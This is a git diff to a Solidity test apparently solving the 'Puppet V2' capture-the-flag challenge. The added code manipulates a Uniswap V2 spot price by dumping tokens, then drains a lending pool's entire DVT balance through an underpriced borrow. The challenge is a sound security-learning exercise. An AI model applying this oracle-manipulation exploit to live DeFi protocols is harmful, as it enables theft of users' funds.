@@ -11,6 +11,8 @@ import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
 
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
 
+import {UniswapV2Library} from "../../../src/Contracts/puppet-v2/UniswapV2Library.sol";
+
 contract PuppetV2 is Test {
     // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
     uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
@@ -103,7 +105,29 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        // just give 5 minutes of deadline for the tx. (it's a local evm so it doesn't matter how long)
+        uint256 deadline = block.timestamp + 300;
+        vm.startPrank(attacker);
 
+        // approve the max amount to move freely
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+
+        // swap all of attackers DVT for WETH
+        // around 9.9 wETH
+        address[] memory pairDVTtoWETH = new address[](2);
+        pairDVTtoWETH[0] = address(dvt);
+        pairDVTtoWETH[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), 0, pairDVTtoWETH, address(attacker), deadline);
+        // calculate the MIN wETH amount needed
+        uint256 wETHAmountNeeded = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        uint256 minWETHTransferNeeded = wETHAmountNeeded - weth.balanceOf(attacker);
+        // acquire wETH by depositing ETH
+        weth.deposit{value: minWETHTransferNeeded}();
+        // drain the pool
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -119,5 +143,12 @@ contract PuppetV2 is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
+    }
+
+    // Fetch the price from Uniswap v2 using the official libraries
+    function _getOracleQuote(uint256 amount) private view returns (uint256) {
+        (uint256 reservesWETH, uint256 reservesToken) =
+            UniswapV2Library.getReserves(address(uniswapV2Factory), address(weth), address(dvt));
+        return UniswapV2Library.quote(amount * (10 ** 18), reservesToken, reservesWETH);
     }
 }
